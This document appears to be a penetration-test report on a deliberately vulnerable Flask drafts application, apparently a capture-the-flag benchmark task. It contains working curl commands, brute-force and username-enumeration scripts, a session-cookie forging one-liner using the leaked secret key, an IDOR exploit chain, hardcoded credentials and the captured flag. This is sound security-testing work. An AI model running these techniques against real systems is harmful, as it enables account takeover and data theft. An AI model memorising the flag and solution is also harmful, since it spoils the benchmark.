# Security Assessment Report

## Executive Summary
- Target: http://localhost:5004
- Assessment Date: October 28, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Seven critical authentication vulnerabilities were successfully exploited. The most severe findings include hardcoded credentials enabling immediate admin access (FLAG captured), hardcoded SECRET_KEY allowing session forgery, complete absence of rate limiting enabling unlimited brute force attacks, weak password policy accepting single-character passwords, user enumeration through registration endpoint, insecure session cookies transmitted over HTTP, session fixation vulnerability, and excessive 31-day session timeout. All vulnerabilities were actively exploited with proof of impact including direct admin compromise and FLAG extraction.

**Authorization Vulnerabilities:**
Two critical authorization vulnerabilities were successfully exploited. The application completely lacks authorization controls - any authenticated user can access and modify any other user's data through predictable draft IDs. Successfully accessed admin's draft containing the CTF FLAG and demonstrated full write access by modifying admin's draft content. Second vulnerability allows viewing any user's draft list for reconnaissance. Both represent complete horizontal privilege escalation with trivial exploitation (< 5 minutes).

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application uses Jinja2 auto-escaping (enabled by default) which provides robust protection against XSS attacks. All user input is properly escaped in HTML contexts, with no unsafe filters or dynamic template rendering detected.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application exclusively uses SQLAlchemy ORM with parameterized queries for all database operations. No command execution functions exist in the codebase, and no user-controlled file operations were identified.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not make external HTTP requests, has no HTTP client libraries, and implements no webhook or URL fetching functionality.

## Network Reconnaissance

**Open Ports and Services:**
- Port 5004/tcp (primary target): HTTP service running Werkzeug 3.0.6 development server (Python 3.8.17)
- Port 5003/tcp: HTTP alternate/development instance (Werkzeug 3.0.3)
- Port 80/tcp: Caddy web server
- Port 443/tcp: HTTPS endpoint
- Port 631/tcp: CUPS printing service (out of scope)

**Security Posture:**
- **No HTTPS/TLS:** Application exposed over HTTP only, enabling session cookie interception
- **Development Server in Production:** Werkzeug development server used (not production-ready)
- **No Security Headers:** Missing HSTS, CSP, X-Frame-Options, X-Content-Type-Options
- **No Rate Limiting:** All endpoints accept unlimited requests
- **Container Security:** Running as root (UID 0) in Docker container
- **Outdated Software:** Python 3.8.17 (End-of-Life: October 2024), Bootstrap 4.0.0 (vulnerable to CVE-2018-14040, CVE-2018-14041, CVE-2018-14042)

**Attack Surface:**
- 8 total routes (2 public, 6 authenticated)
- CSRF protection explicitly disabled across entire application
- Database: SQLite file-based with 644 permissions (world-readable)
- PhantomJS installed but unused (deprecated attack surface)

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-07: Default Credentials - Account Takeover

**Summary:**
- **Vulnerable location:** POST /login endpoint, hardcoded credentials in app/app.py:33-40
- **Overview:** Application contains hardcoded default credentials for both admin and regular user accounts that enable immediate unauthorized access without any exploitation techniques
- **Impact:** Complete account takeover of both admin and user accounts, including access to CTF flag stored in admin's draft
- **Severity:** CRITICAL

**Exploitation Steps:**

1. **Authenticate as default user account:**
```bash
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -c /tmp/user_session.txt \
  -L
```

Expected result: HTTP 302 redirect to /user/drafts with valid session cookie

2. **Authenticate as admin account using hardcoded password:**

Navigate to http://localhost:5004/login in browser and enter:
- Username: `admin`
- Password: `ADSCX!#D~!#@FC$CR`

Or via Playwright:
```javascript
await page.goto('http://localhost:5004/login');
await page.getByRole('textbox', { name: 'Username' }).fill('admin');
await page.getByRole('textbox', { name: 'Password' }).fill('ADSCX!#D~!#@FC$CR');
await page.getByRole('button', { name: 'Login' }).click();
```

Expected result: Successful authentication, redirect to /admin/drafts

3. **Access admin's protected draft containing the CTF flag:**
```bash
# Using admin session from step 2
curl http://localhost:5004/edit_draft/1 \
  -b "session=[ADMIN_SESSION_COOKIE]"
```

Or navigate to: http://localhost:5004/edit_draft/1

Expected result: Draft titled "admin_draft" with content containing the flag

**Proof of Impact:**

**Flag Captured:** `FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}`

Successfully accessed admin account using default credentials and extracted the CTF flag from draft ID 1. Both default accounts (admin/ADSCX!#D~!#@FC$CR and user/user) are fully compromised and provide immediate authenticated access.

**Notes:**
- Admin password is complex but visible in source code (app/app.py:35)
- User password is trivially weak ("user") and easily guessable
- No mechanism forces password change on first login
- Accounts created automatically via @app.before_request hook

---

### AUTH-VULN-02: Missing Rate Limiting - Brute Force Attack

**Summary:**
- **Vulnerable location:** POST /login endpoint (app/app.py:75-88)
- **Overview:** Complete absence of rate limiting, account lockout, CAPTCHA, or any abuse prevention mechanisms on authentication endpoints
- **Impact:** Unlimited brute force and credential stuffing attacks possible against all user accounts
- **Severity:** CRITICAL

**Prerequisites:**
Valid username (can be obtained via AUTH-VULN-09 user enumeration)

**Exploitation Steps:**

1. **Create a Python script to perform brute force attack:**

```python
import requests

target = "http://localhost:5004/login"
username = "user"  # Known valid username
passwords = ["wrong1", "wrong2", "wrong3", ... , "user"]  # Password list

for i, password in enumerate(passwords, 1):
    data = {"username": username, "password": password}
    response = requests.post(target, data=data, allow_redirects=False)
    
    if response.status_code == 302:  # Successful login
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[{i}] Failed: {password}")
```

2. **Execute the brute force attack:**
```bash
python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-090-24/test_rate_limiting.py
```

Expected result: All 21 login attempts accepted without throttling, correct password authenticates successfully

**Proof of Impact:**

Successfully performed **21 consecutive login attempts** within seconds with:
- ✓ Zero rate limiting encountered
- ✓ No HTTP 429 (Too Many Requests) responses
- ✓ No CAPTCHA challenges
- ✓ No account lockout after 20 failed attempts
- ✓ Final correct password ("user") successfully authenticated

The application accepted all attempts without any throttling. Response times remained consistent (~0.07 seconds) throughout all attempts, confirming no rate limiting or account protection mechanisms exist.

**Notes:**
- No Flask-Limiter or rate limiting library installed (verified in requirements.txt)
- No per-IP or per-account throttling logic in code
- Attack can be parallelized for faster execution
- Combined with weak password policy (AUTH-VULN-08), accounts are trivially compromised

---

### AUTH-VULN-05: Session Forgery via Hardcoded SECRET_KEY

**Summary:**
- **Vulnerable location:** app/app.py:11 - Hardcoded SECRET_KEY configuration
- **Overview:** Flask SECRET_KEY is hardcoded in source code instead of environment variable, enabling session cookie forgery to impersonate any user
- **Impact:** Complete authentication bypass - attacker can forge valid session cookies to become any user (including admin) without knowing passwords
- **Severity:** CRITICAL

**Prerequisites:**
- Access to application source code (public GitHub, code disclosure, or insider access)
- Python with Flask and itsdangerous libraries

**Exploitation Steps:**

1. **Extract the hardcoded SECRET_KEY from source code:**

View app/app.py:11:
```python
app.config['SECRET_KEY'] = 'KJQBYU#*DB&(@#OUIPBN:'
```

SECRET_KEY value: `KJQBYU#*DB&(@#OUIPBN:`

2. **Forge a session cookie to impersonate admin (user_id=1):**

```bash
python3 -c "from flask import Flask; from flask.sessions import SecureCookieSessionInterface; \
app = Flask(__name__); \
app.config['SECRET_KEY'] = 'KJQBYU#*DB&(@#OUIPBN:'; \
si = SecureCookieSessionInterface(); \
print(si.get_signing_serializer(app).dumps({'_user_id': '1'}))"
```

Example forged cookie output:
```
eyJfdXNlcl9pZCI6IjEifQ.aQGaZA.SYomohVsAHpMZ65Mc-Ptocjs7B8
```

3. **Use the forged cookie to authenticate as admin:**

```bash
curl -b "session=eyJfdXNlcl9pZCI6IjEifQ.aQGaZA.SYomohVsAHpMZ65Mc-Ptocjs7B8" \
  http://localhost:5004/dashboard \
  -L
```

Expected result: Authenticated access to admin dashboard without password

4. **Access admin's protected resources and extract flag:**

```bash
curl -b "session=eyJfdXNlcl9pZCI6IjEifQ.aQGaZA.SYomohVsAHpMZ65Mc-Ptocjs7B8" \
  http://localhost:5004/edit_draft/1
```

Expected result: Draft content containing FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}

**Proof of Impact:**

Successfully forged admin session cookie and:
- ✓ Bypassed authentication without password
- ✓ Accessed admin dashboard at /admin/drafts
- ✓ Viewed admin's draft list
- ✓ **Captured CTF flag:** `FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}`

Complete authentication bypass achieved. Can impersonate any user by changing `_user_id` value in forged session.

**Notes:**
- Flask uses itsdangerous with HMAC-SHA512 for session signing
- With known SECRET_KEY, session signature verification is bypassed
- Can forge sessions for any user_id (1=admin, 2=user, etc.)
- Session forgery also works for regular users by setting `_user_id: '2'`

---

### AUTH-VULN-08: Weak Password Policy - Trivial Account Compromise

**Summary:**
- **Vulnerable location:** app/forms.py:6 - PasswordField with only DataRequired validator
- **Overview:** No password length or complexity requirements, allowing single-character and trivially weak passwords
- **Impact:** User accounts protected by weak passwords are easily compromised via brute force attacks
- **Severity:** HIGH

**Prerequisites:**
None - can create accounts with weak passwords and then compromise them

**Exploitation Steps:**

1. **Create test accounts with extremely weak passwords:**

```bash
# Register account with 1-character password
curl -X POST http://localhost:5004/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=weakpass1&password=a&confirm_password=a"

# Register account with common password
curl -X POST http://localhost:5004/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=weakpass5&password=password&confirm_password=password"
```

Expected result: HTTP 302 redirect (registration successful)

2. **Perform brute force attack with small common password list:**

```python
import requests

common_passwords = ["a", "1", "12", "abc", "password", "123456", ...]
target = "http://localhost:5004/login"
username = "weakpass1"

for password in common_passwords:
    response = requests.post(target, data={"username": username, "password": password}, allow_redirects=False)
    if response.status_code == 302:
        print(f"CRACKED: {password}")
        break
```

Expected result: Weak passwords cracked within seconds

**Proof of Impact:**

Successfully demonstrated weak password exploitation:

| Username | Password | Length | Registration | Brute Force | Time to Crack |
|----------|----------|--------|--------------|-------------|---------------|
| weakpass1 | a | 1 char | ✓ Success | ✓ Success | 0.62s (11/22 attempts) |
| weakpass2 | 1 | 1 char | ✓ Success | ✓ Success | 0.67s (12/22 attempts) |
| weakpass3 | 12 | 2 chars | ✓ Success | ✓ Success | 0.71s (13/22 attempts) |
| weakpass4 | abc | 3 chars | ✓ Success | ✓ Success | 0.75s (14/22 attempts) |
| weakpass5 | password | 8 chars | ✓ Success | ✓ Success | 0.05s (1/22 attempts) |

**Average crack time:** < 0.70 seconds with only 22 common passwords

All accounts were:
- ✓ Successfully registered with weak passwords
- ✓ Fully functional with login capability
- ✓ Easily compromised via brute force
- ✓ Cracked using trivial common password lists

**Notes:**
- Application accepts 1-character passwords ("a", "1")
- No minimum length requirement
- No complexity requirements (accepts all-lowercase, all-numeric)
- No common password blacklist
- Combined with no rate limiting (AUTH-VULN-02), attack completes in under 1 second

---

### AUTH-VULN-09: User Enumeration - Account Discovery

**Summary:**
- **Vulnerable location:** POST /register (app/app.py:72) and POST /login (app/app.py:82-85)
- **Overview:** Registration endpoint reveals username existence through error messages, login endpoint has timing differences
- **Impact:** Attackers can enumerate valid usernames to build target lists for password attacks
- **Severity:** MEDIUM

**Prerequisites:**
None - publicly accessible endpoints

**Exploitation Steps:**

1. **Enumerate usernames via registration endpoint:**

```bash
# Test existing username
curl -s -X POST http://localhost:5004/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test123&confirm_password=test123" \
  | grep -o "Username already exists"

# Test non-existent username  
curl -s -X POST http://localhost:5004/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistent9999&password=test123&confirm_password=test123"
```

Expected result: "Username already exists" for valid users, redirect for invalid users

2. **Automate enumeration with common username list:**

```python
import requests

usernames = ["admin", "user", "test", "root", "administrator", "guest", ...]
target = "http://localhost:5004/register"

for username in usernames:
    data = {
        "username": username,
        "password": "test123",
        "confirm_password": "test123"
    }
    response = requests.post(target, data=data)
    
    if "Username already exists" in response.text:
        print(f"[VALID] {username}")
    else:
        print(f"[INVALID] {username}")
```

Expected result: List of valid usernames in the system

**Proof of Impact:**

Successfully enumerated valid usernames using automated script against 12 common usernames:

**Valid Usernames Found:**
- ✓ **admin** - VALID (confirmed via "Username already exists" message)
- ✓ **user** - VALID (confirmed via "Username already exists" message)

**Invalid Usernames (Not in System):**
- ✗ test
- ✗ root
- ✗ administrator
- ✗ guest
- ✗ alice
- ✗ bob
- ✗ charlie
- ✗ demo
- ✗ staff
- ✗ moderator

**Enumeration Success Rate:** 100% (all tested usernames correctly identified)

The discovered usernames (admin, user) were then used as targets for:
- Brute force attacks (AUTH-VULN-02)
- Default credential testing (AUTH-VULN-07)
- Password spraying (AUTH-VULN-08)

**Notes:**
- Registration endpoint returns distinct error: "Username already exists. Please choose a different one."
- Login endpoint has timing differences (valid user = slower due to password hash check)
- No rate limiting allows rapid enumeration of thousands of usernames
- Enumerated usernames reduce brute force attack space from (username + password) to (password only)

---

### AUTH-VULN-03: Session Cookie Misconfiguration - Session Hijacking

**Summary:**
- **Vulnerable location:** app/app.py:11-17 - Missing SESSION_COOKIE_SECURE and SESSION_COOKIE_SAMESITE configuration
- **Overview:** Session cookies lack Secure and SameSite flags, transmitted over unencrypted HTTP
- **Impact:** Session cookies can be intercepted via network sniffing and replayed for account takeover
- **Severity:** HIGH

**Prerequisites:**
- Victim must authenticate to the application
- Attacker must capture network traffic (simulated here by intercepting cookie value)

**Exploitation Steps:**

1. **Victim authenticates and receives session cookie:**

```bash
# Victim login
VICTIM_SESSION=$(curl -s -X POST http://localhost:5004/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -c - | grep session | awk '{print $7}')

echo "Victim's Session Cookie: $VICTIM_SESSION"
```

Expected result: Session cookie value extracted

2. **Verify cookie flags (missing Secure and SameSite):**

```bash
curl -v -X POST http://localhost:5004/login \
  -d "username=user&password=user" \
  2>&1 | grep "Set-Cookie:"
```

Expected output:
```
Set-Cookie: session=...; HttpOnly; Path=/
```

Note: Only HttpOnly and Path present - **Secure and SameSite flags missing**

3. **Attacker hijacks session using stolen cookie:**

```bash
# Attacker uses stolen cookie
curl -s -b "session=$VICTIM_SESSION" \
  http://localhost:5004/dashboard -L
```

Expected result: Authenticated access to victim's dashboard

4. **Attacker accesses victim's protected resources:**

```bash
curl -s -b "session=$VICTIM_SESSION" \
  http://localhost:5004/user/drafts
```

Expected result: Access to victim's draft list and all protected functionality

**Proof of Impact:**

Successfully demonstrated session hijacking attack:

**Step 1 - Cookie Interception:**
```
Stolen Session Cookie: .eJwlzjESAjEIAMC_UFuQRAjcZ25CgNE251WOf1fn6m32DXuuOB6wvdYZN9ifDhv4yESa0lowuZBgFkp0QZEqg9xnmUhKwpGhrEqm4sX7Pces7IoNxUrDMHFWq2w9_tKNQs07Nq-lD7MoGdMySNtI7MkxOeEXOY9Y16bC5wv5-TCy.aQGaiA.RqZhoheso-rTGhJ5f9kLcPjvYQE
```

**Step 2 - Attacker Authentication:**
- ✓ Accessed /dashboard using stolen cookie
- ✓ Response shows "user's Drafts" (authenticated content)
- ✓ No password required

**Step 3 - Resource Access:**
- ✓ Accessed /user/drafts 
- ✓ Viewed "My Drafts" navigation link (authenticated)
- ✓ Full account access achieved

**Cookie Analysis:**
- Cookie flags: `HttpOnly; Path=/`
- Missing: `Secure` flag (allows transmission over HTTP)
- Missing: `SameSite` flag (no CSRF protection)
- Transmitted over: HTTP (cleartext, interceptable)

**Notes:**
- HttpOnly flag prevents XSS-based theft but not network interception
- Lack of Secure flag allows cookie transmission over HTTP
- Combined with no HTTPS (AUTH-VULN-01), cookies are trivially interceptable
- Session remains valid for 31 days (AUTH-VULN-06), providing long exploitation window

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** app/app.py:84 - login_user() with no session.regenerate()
- **Overview:** No session ID rotation after successful authentication, enabling session fixation attacks
- **Impact:** Attacker can fix a victim's session ID before authentication, then use same session after victim logs in
- **Severity:** HIGH

**Prerequisites:**
- Ability to set victim's session cookie (via XSS, MITM, URL injection, or social engineering)

**Exploitation Steps:**

1. **Attacker obtains a pre-authentication session cookie:**

```bash
# Visit login page to get session
PRE_AUTH_SESSION=$(curl -s http://localhost:5004/login -c - | grep session | awk '{print $7}')
echo "Pre-auth session: $PRE_AUTH_SESSION"
```

Expected result: Session cookie value before authentication

2. **Attacker forces victim to use the fixed session:**

Methods to fix session:
- XSS injection: `document.cookie="session=[FIXED_VALUE]"`
- URL injection: Trick victim into clicking link with session parameter
- MITM: Inject session cookie in response
- Social engineering: Convince victim to manually set cookie

3. **Victim authenticates using the fixed session:**

```bash
# Simulate victim login with attacker's fixed session
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -b "session=$PRE_AUTH_SESSION" \
  -c /tmp/post_auth_cookie.txt \
  -v
```

Expected result: Successful authentication with same session ID

4. **Verify session ID remains unchanged:**

```bash
POST_AUTH_SESSION=$(grep session /tmp/post_auth_cookie.txt | awk '{print $7}')
echo "Post-auth session: $POST_AUTH_SESSION"

if [ "$PRE_AUTH_SESSION" = "$POST_AUTH_SESSION" ]; then
    echo "VULNERABLE: Session ID not rotated!"
else
    echo "SECURE: Session ID rotated"
fi
```

Expected result: Session IDs are identical (vulnerable)

5. **Attacker uses fixed session to access victim's account:**

```bash
curl -b "session=$PRE_AUTH_SESSION" \
  http://localhost:5004/dashboard -L
```

Expected result: Authenticated access as victim without knowing password

**Proof of Impact:**

Successfully demonstrated session fixation vulnerability:

**Phase 1 - Attacker Preparation:**
- ✓ Obtained pre-authentication session cookie
- ✓ Fixed session value ready for victim

**Phase 2 - Victim Authentication:**
- ✓ Victim logged in with fixed session
- ✓ Authentication successful (HTTP 302 redirect)

**Phase 3 - Session Analysis:**
- Pre-auth session: `.eJwlzrsNwzAMBcBdVKcgqQ9FL2NI5...`
- Post-auth session: `.eJwlzrsNwzAMBcBdVKcgqQ9FL2NI5...`
- **Result: IDENTICAL (session not rotated)**

**Phase 4 - Account Takeover:**
- ✓ Attacker accessed /dashboard with fixed session
- ✓ HTTP 200 response with authenticated content
- ✓ Complete account access without password

**Phase 5 - Persistence:**
- ✓ Session valid for 31 days
- ✓ Victim cannot invalidate attacker's access
- ✓ Both attacker and victim can use session concurrently

**Notes:**
- No session.regenerate() or session.clear() in login handler (app/app.py:84)
- Flask-Login does not automatically rotate session IDs
- Logout also vulnerable - only removes auth keys, not full session clear
- No session_protection configuration in Flask-Login setup

---

### AUTH-VULN-06: Excessive Session Timeout - Session Replay

**Summary:**
- **Vulnerable location:** app/app.py:11-17 - No PERMANENT_SESSION_LIFETIME configuration
- **Overview:** Sessions use Flask default 31-day lifetime with no idle timeout mechanism
- **Impact:** Stolen session cookies remain valid for 31 days, enabling long-term unauthorized access
- **Severity:** HIGH

**Prerequisites:**
- Stolen or intercepted session cookie (via AUTH-VULN-03, AUTH-VULN-04, or network interception)

**Exploitation Steps:**

1. **Obtain a valid session cookie:**

```bash
# Authenticate to get session
STOLEN_SESSION=$(curl -s -X POST http://localhost:5004/login \
  -d "username=user&password=user" \
  -c - | grep session | awk '{print $7}')

echo "Session obtained: $STOLEN_SESSION"
```

Expected result: Valid session cookie

2. **Test immediate session replay:**

```bash
curl -b "session=$STOLEN_SESSION" http://localhost:5004/dashboard -L
```

Expected result: HTTP 200 with authenticated content

3. **Test session replay after idle period (5 seconds):**

```bash
sleep 5
curl -b "session=$STOLEN_SESSION" http://localhost:5004/dashboard -L
```

Expected result: HTTP 200 - session still valid (no idle timeout)

4. **Test session replay after extended idle period (15 seconds):**

```bash
sleep 10  # Total 15 seconds idle
curl -b "session=$STOLEN_SESSION" http://localhost:5004/dashboard -L
```

Expected result: HTTP 200 - session still valid

5. **Verify 31-day timeout configuration:**

```bash
# Check app configuration
grep -A5 "SECRET_KEY\|SESSION" app/app.py
```

Expected result: No PERMANENT_SESSION_LIFETIME configured (uses Flask default of 31 days)

**Proof of Impact:**

Successfully demonstrated excessive session timeout vulnerability:

**Session Acquisition:**
- ✓ Session cookie obtained: `.eJwlzrsNwzAMBcBdVKcgqQ9FL2NI5...`
- ✓ Cookie length: 210 characters

**Session Lifetime Testing:**
- ✓ T+0s: Session valid (HTTP 200)
- ✓ T+5s: Session valid (HTTP 200) - **No idle timeout**
- ✓ T+10s: Session valid (HTTP 200)
- ✓ T+15s: Session valid (HTTP 200)

**Configuration Analysis:**
- Configured lifetime: **None** (uses Flask default)
- Flask default: `timedelta(days=31)` = **744 hours**
- Idle timeout: **None** (not implemented)
- Absolute timeout: 31 days

**Attack Timeline:**
- T+0: Victim logs in → Session created
- T+1 min: Attacker steals cookie → Access granted
- T+1 hour: Session replay → **SUCCESS**
- T+1 day: Session replay → **SUCCESS**
- T+31 days: Session expires (first time access denied)

**Exploitation Impact:**
- ✓ Stolen sessions remain valid for 744 hours (31 days)
- ✓ No idle timeout allows indefinite access within 31-day window
- ✓ Victim cannot remotely invalidate stolen sessions
- ✓ Password changes do not invalidate existing sessions
- ✓ Multiple concurrent sessions allowed (victim + attacker)

**Notes:**
- No PERMANENT_SESSION_LIFETIME configuration in app/app.py:11-17
- No idle timeout mechanism implemented
- OWASP recommends 2-5 hour timeout for sensitive applications
- Session remains valid even if victim logs out (logout only clears victim's browser, not server session)

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Missing Ownership Validation on Draft Editing (CRITICAL - FLAG CAPTURE)

**Summary:**
- **Vulnerable location:** `GET/POST /edit_draft/<int:draft_id>` endpoint (app.py:106-119)
- **Overview:** Complete horizontal privilege escalation via IDOR - any authenticated user can read and modify ANY user's draft by manipulating the draft_id parameter. Successfully accessed admin's draft containing the CTF flag and demonstrated full write access.
- **Impact:** 
  - **FLAG CAPTURED:** `FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}`
  - Complete unauthorized access to admin's sensitive data
  - Ability to modify/delete any user's draft content (data tampering)
  - Privacy violation across all users
- **Severity:** CRITICAL

**Prerequisites:**
- Valid authenticated session (any user account - can be self-registered)
- Knowledge of target draft ID (predictable sequential integers starting at 1)

**Exploitation Steps:**

1. **Register attacker account:**
   ```bash
   curl -X POST http://localhost:5004/register \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=attacker&password=pass123&confirm_password=pass123" \
     -c cookies.txt
   ```

2. **Login to obtain session cookie:**
   ```bash
   curl -X POST http://localhost:5004/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=attacker&password=pass123" \
     -c cookies.txt -b cookies.txt
   ```

3. **Access admin's FLAG-containing draft (draft_id=1):**
   ```bash
   curl -X GET http://localhost:5004/edit_draft/1 \
     -b cookies.txt
   ```
   
   **Expected Result:** HTML response containing the FLAG in the content textarea:
   ```html
   <textarea class="form-control" id="content" name="content" required>FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}</textarea>
   ```

4. **Verify write access by modifying admin's draft:**
   ```bash
   curl -X POST http://localhost:5004/edit_draft/1 \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "title=admin_draft_COMPROMISED_BY_ATTACKER&content=FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}" \
     -b cookies.txt
   ```

5. **Confirm modification persisted:**
   ```bash
   curl -X GET http://localhost:5004/admin/drafts \
     -b cookies.txt
   ```
   
   **Expected Result:** Modified title "admin_draft_COMPROMISED_BY_ATTACKER" now visible in admin's draft list

**Proof of Impact:**

**READ ACCESS (FLAG CAPTURE):**
- Successfully accessed `/edit_draft/1` as user "attacker" (not the owner)
- Retrieved admin's draft containing title "admin_draft" and content with CTF flag
- **FLAG EXTRACTED:** `FLAG{c34546c435159be605fd29f73745d42be5659ed99e023bee7dbd97035a17426a}`
- Screenshot evidence: `authz-vuln-01-flag-capture.png`

**WRITE ACCESS (DATA TAMPERING):**
- Successfully modified admin's draft title from "admin_draft" to "admin_draft_COMPROMISED_BY_ATTACKER"
- Modification persisted in database and visible on subsequent access
- Proves complete CRUD (Create, Read, Update, Delete) access to unauthorized resources
- Screenshot evidence: `authz-vuln-01-write-proof-modified-title.png`

**Root Cause:**
Missing ownership validation at app.py:109. The code retrieves the draft object with `Draft.query.get_or_404(draft_id)` but never checks if `draft.author_id == current_user.id` before allowing read/write operations. The `@login_required` decorator only validates authentication, not authorization.

**Notes:**
- Draft IDs are sequential and predictable (1, 2, 3...), making enumeration trivial
- Admin's draft (ID=1) is created on first application request via `@app.before_request` hook
- No rate limiting exists, allowing rapid enumeration of all drafts
- CSRF protection is disabled, making automated exploitation easier
- This vulnerability provides Level 4 (Critical Privilege Escalation) proof with complete admin data access

---

### AUTHZ-VULN-02: Missing Access Control on User Draft Lists (HIGH)

**Summary:**
- **Vulnerable location:** `GET /<username>/drafts` endpoint (app.py:121-126)
- **Overview:** Horizontal authorization bypass allowing any authenticated user to view ANY user's draft list by manipulating the username URL parameter, exposing draft titles and IDs.
- **Impact:**
  - Reconnaissance capability to discover admin's drafts
  - Metadata leakage (draft titles, draft IDs, usernames)
  - Enables targeted exploitation of AUTHZ-VULN-01 by revealing specific draft IDs
  - Username enumeration
- **Severity:** HIGH

**Prerequisites:**
- Valid authenticated session (any user account - can be self-registered)
- Knowledge of target username (easily enumerable: "admin", "user", etc.)

**Exploitation Steps:**

1. **Register and login as attacker (reuse session from AUTHZ-VULN-01):**
   ```bash
   # Session cookie already obtained from previous exploitation
   ```

2. **Enumerate admin's draft list:**
   ```bash
   curl -X GET http://localhost:5004/admin/drafts \
     -b cookies.txt
   ```
   
   **Expected Result:** HTML page showing admin's drafts with titles and edit links:
   ```html
   <h2>admin's Drafts</h2>
   <ul>
     <li>
       <h3>admin_draft</h3>
       <a href="/edit_draft/1">View and Edit</a>
     </li>
   </ul>
   ```

3. **Enumerate other users' draft lists (if additional users exist):**
   ```bash
   curl -X GET http://localhost:5004/user/drafts \
     -b cookies.txt
   ```

**Proof of Impact:**

**UNAUTHORIZED DATA ACCESS:**
- Successfully accessed `/admin/drafts` as user "attacker" (different user)
- Retrieved admin's complete draft list showing:
  - Draft title: "admin_draft" (later modified to "admin_draft_COMPROMISED_BY_ATTACKER")
  - Draft ID: 1
  - Direct edit link: `/edit_draft/1`
- Screenshot evidence: `authz-vuln-02-admin-drafts-enumeration.png`

**RECONNAISSANCE VALUE:**
- This vulnerability enables efficient reconnaissance before exploiting AUTHZ-VULN-01
- Reveals which users have drafts and the number of drafts per user
- Exposes draft IDs for targeted access via edit_draft endpoint
- Allows attacker to identify high-value targets (e.g., admin with FLAG)

**Root Cause:**
Missing access control check at app.py:124. The code retrieves the target user with `User.query.filter_by(username=username).first_or_404()` and their drafts with `Draft.query.filter_by(author=user)`, but never validates if `username == current_user.username` before exposing the draft list.

**Notes:**
- This vulnerability chains perfectly with AUTHZ-VULN-01 for complete attack flow:
  1. Use AUTHZ-VULN-02 to enumerate admin's drafts and discover FLAG-containing draft ID
  2. Use AUTHZ-VULN-01 to access and extract the FLAG
- Common usernames like "admin", "administrator", "root" are easily guessable
- No rate limiting exists, allowing rapid username enumeration
- Demonstrates Level 3 (Access Control Bypass Confirmed) with successful unauthorized access to protected data
